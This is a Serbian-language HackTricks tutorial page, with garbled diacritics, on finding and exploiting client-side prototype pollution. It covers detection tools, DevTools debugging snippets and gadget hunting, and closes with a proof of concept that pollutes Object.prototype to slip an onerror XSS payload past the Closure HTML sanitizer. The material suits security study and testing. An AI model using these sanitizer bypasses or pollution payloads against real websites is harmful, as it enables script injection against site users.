# Klijentska strana Prototip Pollution

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Otkrivanje kori코캖enjem automatskih alata

Alati [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **i** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) mogu se koristiti za **pronala쬰nje ranjivosti prototip pollution**.

Pored toga, mo쬰te koristiti i **browser ekstenziju** [**PPScan**](https://github.com/msrkp/PPScan) da **automatski skenirate** **stranice** koje **pristupate** u potrazi za ranjivostima prototip pollution.

### Debugovanje gde se koristi svojstvo <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Pronala쬰nje osnovnog uzroka Prototype Pollution <a href="#id-5530" id="id-5530"></a>

Kada je ranjivost na prototype pollution identifikovana pomo캖u bilo kog alata, i ako kod nije previ코e slo쬰n, mo쬰te prona캖i ranjivost pretra쬴vanjem klju캜nih re캜i poput `location.hash`, `decodeURIComponent`, ili `location.search` u Chrome Developer alatima. Ovaj pristup vam omogu캖ava da precizno odredite ranjivi deo JavaScript koda.

Za ve캖e i kompleksnije kodne baze, jednostavan metod otkrivanja ranjivog koda uklju캜uje slede캖e korake:

1. Koristite alat za identifikaciju ranjivosti i dobijte payload dizajniran da postavi svojstvo u konstruktoru. Primer koji pru쬬 ppmap mo쬰 izgledati ovako: `constructor[prototype][ppmap]=reserved`.
2. Postavite prekidnu ta캜ku na prvu liniju JavaScript koda koja 캖e se izvr코iti na stranici. Osve쬴te stranicu sa payload-om, zaustavljaju캖i izvr코avanje na ovoj ta캜ki prekida.
3. Dok je izvr코avanje JavaScript-a zaustavljeno, izvr코ite slede캖i skript u JS konzoli. Ova skripta 캖e signalizirati kada je svojstvo 'ppmap' kreirano, poma쬿캖i u lociranju njegovog porekla:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Vratite se na karticu **Izvori** i izaberite "Nastavi izvr코avanje skripte". JavaScript 캖e nastaviti izvr코avanje, a svojstvo 'ppmap' 캖e biti zaga캠eno kao 코to se o캜ekivalo. Kori코캖enje prilo쬰nog ise캜ka olak코ava identifikaciju ta캜ne lokacije gde je svojstvo 'ppmap' zaga캠eno. Prou캜avanjem **Steka poziva**, mogu se primetiti razli캜iti stekovi gde se zaga캠enje desilo.

Prilikom odlu캜ivanja koji stek istra쬴ti, 캜esto je korisno ciljati stekove povezane sa JavaScript bibliotekama, jer se zaga캠enje prototipa 캜esto de코ava unutar ovih biblioteka. Identifikujte relevantan stek prou캜avanjem njegovog povezivanja sa bibliote캜kim fajlovima (vidljivo sa desne strane, sli캜no kao na slici data za vo캠enje). U scenarijima sa vi코e stekova, poput onih na linijama 4 i 6, logi캜an izbor je stek na liniji 4, jer predstavlja po캜etno pojavljivanje zaga캠enja i time korena ranjivosti. Klikom na stek bi캖ete usmereni ka ranjivom kodu.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Pronala쬰nje skript ged쬰ta

Ged쬰t je **kod koji 캖e biti zloupotrebljen kada se otkrije ranjivost PP**.

Ako je aplikacija jednostavna, mo쬰mo **tra쬴ti** **klju캜ne re캜i** poput **`srcdoc/innerHTML/iframe/createElement`** i pregledati izvorni kod da bismo proverili da li **vodi ka izvr코avanju JavaScript-a**. Ponekad, pomenute tehnike mo쬯a ne캖e prona캖i ged쬰te uop코te. U tom slu캜aju, 캜isto pregledanje izvornog koda otkriva neke lepe ged쬰te poput primera ispod.

### Primer pronala쬰nja PP ged쬰ta u kodu biblioteke Mithil

Proverite ovaj tekst: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Rekompilacija payload-a za ranjive biblioteke

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bajpasovanje HTML sanitizera putem PP

[**Ovo istra쬴vanje**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) pokazuje PP ged쬰te koje treba koristiti za **bajpasovanje sanitizacije** koju pru쬬ju neke biblioteke HTML sanitizera:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Reference

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
